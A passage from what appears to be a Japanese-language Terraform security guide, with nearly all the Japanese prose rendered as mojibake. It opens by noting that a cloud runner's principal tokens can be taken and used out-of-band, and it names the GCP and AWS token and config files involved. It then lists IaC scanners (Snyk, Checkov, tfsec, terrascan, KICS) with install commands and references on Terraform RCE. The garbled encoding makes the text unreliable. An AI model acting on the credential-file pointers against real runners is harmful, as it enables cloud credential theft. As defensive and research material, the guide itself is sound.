ãƒ©ãƒ³ãƒŠãƒ¼ãŒä½•ã‚‰ã‹ã®ã‚¯ãƒ©ã‚¦ãƒ‰ç’°å¢ƒå†…ã«å­˜åœ¨ã™ã‚‹å ´åˆã€ãã®ãƒ©ãƒ³ãƒŠãƒ¼ã«ç´ã¥ã‘ã‚‰ã‚ŒãŸãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã—ã€ã‚¢ã‚¦ãƒˆã‚ªãƒ–ãƒãƒ³ãƒ‰ã§åˆ©ç”¨ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚

- **GCP files (ç¾åœ¨ã®å®Ÿè¡Œãƒ¯ãƒ¼ã‚­ãƒ³ã‚°ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«å­˜åœ¨)**
- `tfc-google-application-credentials` â€” å¤–éƒ¨ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ã‚’äº¤æ›ã™ã‚‹æ–¹æ³•ã‚’ Google ã«æŒ‡ç¤ºã™ã‚‹ Workload Identity Federation(WIF) ç”¨ã® JSON è¨­å®šã€‚
- `tfc-gcp-token` â€” ä¸Šè¨˜ã§å‚ç…§ã•ã‚Œã‚‹çŸ­æœŸé–“æœ‰åŠ¹ï¼ˆâ‰ˆ1æ™‚é–“ï¼‰ã® GCP ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³

- **AWS ãƒ•ã‚¡ã‚¤ãƒ«**
- `tfc-aws-shared-config` â€” web identity federation/OIDC ã«ã‚ˆã‚‹ãƒ­ãƒ¼ãƒ«ã‚¢ã‚µãƒ³ãƒ—ã‚·ãƒ§ãƒ³ç”¨ã® JSONï¼ˆé™çš„ã‚­ãƒ¼ã‚ˆã‚Šæ¨å¥¨ï¼‰ã€‚
- `tfc-aws-token` â€” çŸ­æœŸé–“æœ‰åŠ¹ãªãƒˆãƒ¼ã‚¯ãƒ³ã€ã¾ãŸã¯è¨­å®šãƒŸã‚¹ãŒã‚ã‚‹å ´åˆã¯é™çš„ãª IAM ã‚­ãƒ¼ã®å¯èƒ½æ€§ã‚‚ã‚ã‚‹ã€‚


## è‡ªå‹•ç›£æŸ»ãƒ„ãƒ¼ãƒ«

### [**Snyk Infrastructure as Code (IaC)**](https://snyk.io/product/infrastructure-as-code-security/)

Snyk ã¯ Terraformã€CloudFormationã€Kubernetesã€ãã®ä»–ã® IaC ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆã«ãŠã‘ã‚‹è„†å¼±æ€§ã‚„è¨­å®šãƒŸã‚¹ã‚’æ¤œå‡ºã™ã‚‹åŒ…æ‹¬çš„ãª Infrastructure as Code (IaC) ã‚¹ã‚­ãƒ£ãƒ³ã‚½ãƒªãƒ¥ãƒ¼ã‚·ãƒ§ãƒ³ã‚’æä¾›ã—ã¾ã™ã€‚

- **æ©Ÿèƒ½:**
- ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è„†å¼±æ€§ã‚„ã‚³ãƒ³ãƒ—ãƒ©ã‚¤ã‚¢ãƒ³ã‚¹å•é¡Œã«å¯¾ã™ã‚‹ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ã‚¹ã‚­ãƒ£ãƒ³ã€‚
- ãƒãƒ¼ã‚¸ãƒ§ãƒ³ç®¡ç†ã‚·ã‚¹ãƒ†ãƒ ï¼ˆGitHubã€GitLabã€Bitbucketï¼‰ã¨ã®çµ±åˆã€‚
- è‡ªå‹•çš„ãªä¿®æ­£ç”¨ãƒ—ãƒ«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã€‚
- è©³ç´°ãªä¿®å¾©ã‚¢ãƒ‰ãƒã‚¤ã‚¹ã€‚
- **ã‚µã‚¤ãƒ³ã‚¢ãƒƒãƒ—:** [Snyk](https://snyk.io/) ã§ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä½œæˆã—ã¦ãã ã•ã„ã€‚
```bash
brew tap snyk/tap
brew install snyk
snyk auth
snyk iac test /path/to/terraform/code
```
### [Checkov](https://github.com/bridgecrewio/checkov) <a href="#install-checkov-from-pypi" id="install-checkov-from-pypi"></a>

**Checkov** ã¯ã€infrastructure as code (IaC) å‘ã‘ã®é™çš„ã‚³ãƒ¼ãƒ‰è§£æãƒ„ãƒ¼ãƒ«ã§ã‚ã‚Šã€ã‚¤ãƒ¡ãƒ¼ã‚¸ã‚„ã‚ªãƒ¼ãƒ—ãƒ³ã‚½ãƒ¼ã‚¹ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸å‘ã‘ã®ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢æ§‹æˆè§£æ (SCA) ãƒ„ãƒ¼ãƒ«ã§ã‚‚ã‚ã‚Šã¾ã™ã€‚

ã“ã‚Œã¯ã€[Terraform](https://terraform.io/)ã€[Terraform plan](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Terraform%20Plan%20Scanning.md)ã€[Cloudformation](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Cloudformation.md)ã€[AWS SAM](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/AWS%20SAM.md)ã€[Kubernetes](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kubernetes.md)ã€[Helm charts](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Helm.md)ã€[Kustomize](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kustomize.md)ã€[Dockerfile](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Dockerfile.md)ã€[Serverless](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Serverless%20Framework.md)ã€[Bicep](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Bicep.md)ã€[OpenAPI](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/OpenAPI.md)ã€[ARM Templates](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Azure%20ARM%20templates.md)ã€ã¾ãŸã¯[OpenTofu](https://opentofu.org/) ã‚’ä½¿ç”¨ã—ã¦ãƒ—ãƒ­ãƒ“ã‚¸ãƒ§ãƒ‹ãƒ³ã‚°ã•ã‚ŒãŸã‚¯ãƒ©ã‚¦ãƒ‰ã‚¤ãƒ³ãƒ•ãƒ©ã‚¹ãƒˆãƒ©ã‚¯ãƒãƒ£ã‚’ã‚¹ã‚­ãƒ£ãƒ³ã—ã€ã‚°ãƒ©ãƒ•ãƒ™ãƒ¼ã‚¹ã®ã‚¹ã‚­ãƒ£ãƒ³ã§ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãŠã‚ˆã³ã‚³ãƒ³ãƒ—ãƒ©ã‚¤ã‚¢ãƒ³ã‚¹ã®è¨­å®šãƒŸã‚¹ã‚’æ¤œå‡ºã—ã¾ã™ã€‚

ã¾ãŸã€[Software Composition Analysis (SCA) scanning](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Sca.md) ã‚’å®Ÿè¡Œã—ã€ã‚ªãƒ¼ãƒ—ãƒ³ã‚½ãƒ¼ã‚¹ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã‚„ã‚¤ãƒ¡ãƒ¼ã‚¸ã‚’å¯¾è±¡ã« Common Vulnerabilities and Exposures (CVEs) ã‚’æ¤œå‡ºã™ã‚‹ã‚¹ã‚­ãƒ£ãƒ³ã‚’è¡Œã„ã¾ã™ã€‚
```bash
pip install checkov
checkov -d /path/to/folder
```
### [terraform-compliance](https://github.com/terraform-compliance/cli)

From the [**docs**](https://github.com/terraform-compliance/cli): `terraform-compliance` ã¯ã€terraform ã«å¯¾ã™ã‚‹è»½é‡ã§ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãŠã‚ˆã³ã‚³ãƒ³ãƒ—ãƒ©ã‚¤ã‚¢ãƒ³ã‚¹ã«ç„¦ç‚¹ã‚’å½“ã¦ãŸãƒ†ã‚¹ãƒˆãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã§ã€ã‚ãªãŸã® Infrastructure-as-Code (IaC) ã«å¯¾ã™ã‚‹ãƒã‚¬ãƒ†ã‚£ãƒ–ãƒ†ã‚¹ãƒˆæ©Ÿèƒ½ã‚’æä¾›ã—ã¾ã™ã€‚

- **compliance:** å®Ÿè£…ã•ã‚ŒãŸã‚³ãƒ¼ãƒ‰ãŒã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£åŸºæº–ã‚„ç‹¬è‡ªã®åŸºæº–ã«å¾“ã£ã¦ã„ã‚‹ã“ã¨ã‚’ä¿è¨¼ã—ã¾ã™
- **behaviour driven development:** ã»ã¼ã™ã¹ã¦ã«å¯¾ã—ã¦ BDD ãŒã‚ã‚‹ãªã‚‰ã€IaC ã«ã‚‚ã‚ã‚‹ã¹ãã§ã¯ï¼Ÿ
- **portable:** `pip` ã‹ã‚‰ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã™ã‚‹ã‹ `docker` ã§å®Ÿè¡Œã™ã‚‹ã ã‘ã§ã™ã€‚See [Installation](https://terraform-compliance.com/pages/installation/)
- **pre-deploy:** ãƒ‡ãƒ—ãƒ­ã‚¤å‰ã«ã‚³ãƒ¼ãƒ‰ã‚’æ¤œè¨¼ã—ã¾ã™
- **easy to integrate:** pipelineï¼ˆã¾ãŸã¯ git hooksï¼‰ã§å®Ÿè¡Œã§ãã€ã™ã¹ã¦ã®ãƒ‡ãƒ—ãƒ­ã‚¤ãŒæ¤œè¨¼ã•ã‚Œã‚‹ã“ã¨ã‚’ä¿è¨¼ã§ãã¾ã™ã€‚
- **segregation of duty:** ãƒ†ã‚¹ãƒˆã‚’åˆ¥ã®ãƒªãƒã‚¸ãƒˆãƒªã«ä¿æŒã—ã€åˆ¥ãƒãƒ¼ãƒ ãŒè²¬ä»»ã‚’æŒã¤ã‚ˆã†ã«ã§ãã¾ã™ã€‚

> [!NOTE]
> æ®‹å¿µãªãŒã‚‰ã€ã‚³ãƒ¼ãƒ‰ãŒã‚ãªãŸãŒã‚¢ã‚¯ã‚»ã‚¹ã§ããªã„ã„ãã¤ã‹ã® providers ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã€`terraform plan` ã‚’å®Ÿè¡Œã§ããšã€ã“ã®ãƒ„ãƒ¼ãƒ«ã‚’å‹•ã‹ã›ãªã„å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
```bash
pip install terraform-compliance
terraform plan -out=plan.out
terraform-compliance -f /path/to/folder
```
### [tfsec](https://github.com/aquasecurity/tfsec)

From the [**docs**](https://github.com/aquasecurity/tfsec): tfsec ã¯ Terraform ã‚³ãƒ¼ãƒ‰ã®é™çš„è§£æã‚’ç”¨ã„ã¦ã€æ½œåœ¨çš„ãªèª¤è¨­å®šã‚’æ¤œå‡ºã—ã¾ã™ã€‚

- â˜ï¸ ä¸»è¦ï¼ˆãŠã‚ˆã³ä¸€éƒ¨ã®ãƒã‚¤ãƒŠãƒ¼ï¼‰ãªã‚¯ãƒ©ã‚¦ãƒ‰ãƒ—ãƒ­ãƒã‚¤ãƒ€å…¨ä½“ã®èª¤è¨­å®šã‚’ãƒã‚§ãƒƒã‚¯ã—ã¾ã™
- â›” æ•°ç™¾ã®çµ„ã¿è¾¼ã¿ãƒ«ãƒ¼ãƒ«
- ğŸª† ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ï¼ˆãƒ­ãƒ¼ã‚«ãƒ«ãŠã‚ˆã³ãƒªãƒ¢ãƒ¼ãƒˆï¼‰ã‚’ã‚¹ã‚­ãƒ£ãƒ³ã—ã¾ã™
- â• HCL å¼ã¨ãƒªãƒ†ãƒ©ãƒ«å€¤ã®ä¸¡æ–¹ã‚’è©•ä¾¡ã—ã¾ã™
- â†ªï¸ Terraform é–¢æ•°ï¼ˆä¾‹: `concat()`ï¼‰ã‚’è©•ä¾¡ã—ã¾ã™
- ğŸ”— Terraform ãƒªã‚½ãƒ¼ã‚¹é–“ã®é–¢ä¿‚æ€§ã‚’è©•ä¾¡ã—ã¾ã™
- ğŸ§° Terraform CDK ã¨äº’æ›æ€§ãŒã‚ã‚Šã¾ã™
- ğŸ™… ãƒ¦ãƒ¼ã‚¶ãƒ¼å®šç¾©ã® Rego ãƒãƒªã‚·ãƒ¼ã‚’é©ç”¨ï¼ˆãŠã‚ˆã³æ‹¡å¼µï¼‰ã—ã¾ã™
- ğŸ“ƒ è¤‡æ•°ã®å‡ºåŠ›ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆã‚’ã‚µãƒãƒ¼ãƒˆ: lovely (default), JSON, SARIF, CSV, CheckStyle, JUnit, text, Gif.
- ğŸ› ï¸ è¨­å®šå¯èƒ½ï¼ˆCLI ãƒ•ãƒ©ã‚°ãŠã‚ˆã³/ã¾ãŸã¯è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«çµŒç”±ï¼‰
- âš¡ éå¸¸ã«é«˜é€Ÿã§ã€å¤§è¦æ¨¡ãªãƒªãƒã‚¸ãƒˆãƒªã‚’ç´ æ—©ãã‚¹ã‚­ãƒ£ãƒ³ã§ãã¾ã™
```bash
brew install tfsec
tfsec /path/to/folder
```
### [terrascan](https://github.com/tenable/terrascan)

Terrascanã¯Infrastructure as Codeå‘ã‘ã®static code analyzerã§ã™ã€‚Terrascanã‚’ä½¿ç”¨ã™ã‚‹ã¨æ¬¡ã®ã“ã¨ãŒå¯èƒ½ã§ã™ï¼š

- ã‚·ãƒ¼ãƒ ãƒ¬ã‚¹ã« infrastructure as code ã®è¨­å®šãƒŸã‚¹ã‚’ã‚¹ã‚­ãƒ£ãƒ³ã™ã‚‹ã€‚
- ãƒ—ãƒ­ãƒ“ã‚¸ãƒ§ãƒ‹ãƒ³ã‚°ã•ã‚ŒãŸã‚¯ãƒ©ã‚¦ãƒ‰ã‚¤ãƒ³ãƒ•ãƒ©ã®è¨­å®šå¤‰æ›´ï¼ˆãƒã‚¹ãƒãƒ£ãƒ¼ãƒ‰ãƒªãƒ•ãƒˆã‚’å¼•ãèµ·ã“ã™ã‚‚ã®ï¼‰ã‚’ç›£è¦–ã—ã€å®‰å…¨ãªãƒã‚¹ãƒãƒ£ãƒ¼ã«æˆ»ã™ã“ã¨ã‚’å¯èƒ½ã«ã™ã‚‹ã€‚
- ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è„†å¼±æ€§ã¨ã‚³ãƒ³ãƒ—ãƒ©ã‚¤ã‚¢ãƒ³ã‚¹é•åã‚’æ¤œå‡ºã™ã‚‹ã€‚
- ã‚¯ãƒ©ã‚¦ãƒ‰ãƒã‚¤ãƒ†ã‚£ãƒ–ã‚¤ãƒ³ãƒ•ãƒ©ã®ãƒ—ãƒ­ãƒ“ã‚¸ãƒ§ãƒ‹ãƒ³ã‚°å‰ã«ãƒªã‚¹ã‚¯ã‚’è»½æ¸›ã™ã‚‹ã€‚
- ãƒ­ãƒ¼ã‚«ãƒ«ã§ã®å®Ÿè¡Œã‚„ CI\CD ã¨ã®çµ±åˆãªã©æŸ”è»Ÿã«é‹ç”¨ã§ãã‚‹ã€‚
```bash
brew install terrascan
terrascan scan -d /path/to/folder
```
### [KICKS](https://github.com/Checkmarx/kics)

Checkmarxã«ã‚ˆã‚‹**KICS**ã‚’ä½¿ç”¨ã—ã¦ã€Infrastructure-as-Codeã®é–‹ç™ºã‚µã‚¤ã‚¯ãƒ«ã®æ—©ã„æ®µéšã§ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è„†å¼±æ€§ã€ã‚³ãƒ³ãƒ—ãƒ©ã‚¤ã‚¢ãƒ³ã‚¹å•é¡Œã€ãŠã‚ˆã³ã‚¤ãƒ³ãƒ•ãƒ©è¨­å®šã®èª¤ã‚Šã‚’ç™ºè¦‹ã—ã¾ã™ã€‚

**KICS**ã¯ã€ŒKeeping Infrastructure as Code Secureã€ã®ç•¥ã§ã€ã‚ªãƒ¼ãƒ—ãƒ³ã‚½ãƒ¼ã‚¹ã§ã‚ã‚Šã€ã‚ã‚‰ã‚†ã‚‹ã‚¯ãƒ©ã‚¦ãƒ‰ãƒã‚¤ãƒ†ã‚£ãƒ–ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã«ã¨ã£ã¦å¿…é ˆã®ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚
```bash
docker run -t -v $(pwd):/path checkmarx/kics:latest scan -p /path -o "/path/"
```
### [Terrascan](https://github.com/tenable/terrascan)

From the [**docs**](https://github.com/tenable/terrascan): Terrascan ã¯ Infrastructure as Codeï¼ˆIaCï¼‰ã®é™çš„ã‚³ãƒ¼ãƒ‰è§£æãƒ„ãƒ¼ãƒ«ã§ã™ã€‚Terrascan ã«ã‚ˆã‚Šä»¥ä¸‹ãŒå¯èƒ½ã«ãªã‚Šã¾ã™:

- IaC ã®èª¤è¨­å®šã‚’ã‚·ãƒ¼ãƒ ãƒ¬ã‚¹ã«ã‚¹ã‚­ãƒ£ãƒ³ã™ã‚‹ã€‚
- ãƒ—ãƒ­ãƒ“ã‚¸ãƒ§ãƒ‹ãƒ³ã‚°æ¸ˆã¿ã®ã‚¯ãƒ©ã‚¦ãƒ‰ã‚¤ãƒ³ãƒ•ãƒ©ã‚’ç›£è¦–ã—ã€è¨­å®šå¤‰æ›´ã«ã‚ˆã£ã¦ç”Ÿã˜ã‚‹æ§‹æˆãƒ‰ãƒªãƒ•ãƒˆï¼ˆposture driftï¼‰ã‚’æ¤œå‡ºã—ã€ã‚»ã‚­ãƒ¥ã‚¢ãªçŠ¶æ…‹ã¸æˆ»ã™ã“ã¨ã‚’å¯èƒ½ã«ã™ã‚‹ã€‚
- ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è„†å¼±æ€§ã‚„ã‚³ãƒ³ãƒ—ãƒ©ã‚¤ã‚¢ãƒ³ã‚¹é•åã‚’æ¤œå‡ºã™ã‚‹ã€‚
- ã‚¯ãƒ©ã‚¦ãƒ‰ãƒã‚¤ãƒ†ã‚£ãƒ–ãªã‚¤ãƒ³ãƒ•ãƒ©ã‚’ãƒ—ãƒ­ãƒ“ã‚¸ãƒ§ãƒ‹ãƒ³ã‚°ã™ã‚‹å‰ã«ãƒªã‚¹ã‚¯ã‚’è»½æ¸›ã™ã‚‹ã€‚
- ãƒ­ãƒ¼ã‚«ãƒ«ã§å®Ÿè¡Œã™ã‚‹ã‹ã€CI\CD ã«çµ±åˆã™ã‚‹æŸ”è»Ÿæ€§ã‚’æä¾›ã™ã‚‹ã€‚
```bash
brew install terrascan
```
## å‚è€ƒæ–‡çŒ®

- [Atlantis Security](atlantis-security.md)
- [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
- [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
- [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)
- [https://github.com/offensive-actions/terraform-provider-statefile-rce](https://github.com/offensive-actions/terraform-provider-statefile-rce)
- [Terraform Cloud token abuse turns speculative plan into remote code execution](https://www.pentestpartners.com/security-blog/terraform-token-abuse-speculative-plan/)
- [Terraform Cloud permissions](https://developer.hashicorp.com/terraform/cloud-docs/users-teams-organizations/permissions)
- [Terraform Cloud API â€“ Show workspace](https://developer.hashicorp.com/terraform/cloud-docs/api-docs/workspaces#show-workspace)
- [AWS provider configuration](https://registry.terraform.io/providers/hashicorp/aws/latest/docs#provider-configuration)
- [AWS CLI â€“ OIDC role assumption](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-role.html#cli-configure-role-oidc)
- [GCP provider â€“ Using Terraform Cloud](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider_reference.html#using-terraform-cloud)
- [Terraform â€“ Sensitive variables](https://developer.hashicorp.com/terraform/tutorials/configuration-language/sensitive-variables)
- [Snyk Labs â€“ Gitflops: dangers of Terraform automation platforms](https://labs.snyk.io/resources/gitflops-dangers-of-terraform-automation-platforms/)

{{#include ../banners/hacktricks-training.md}}
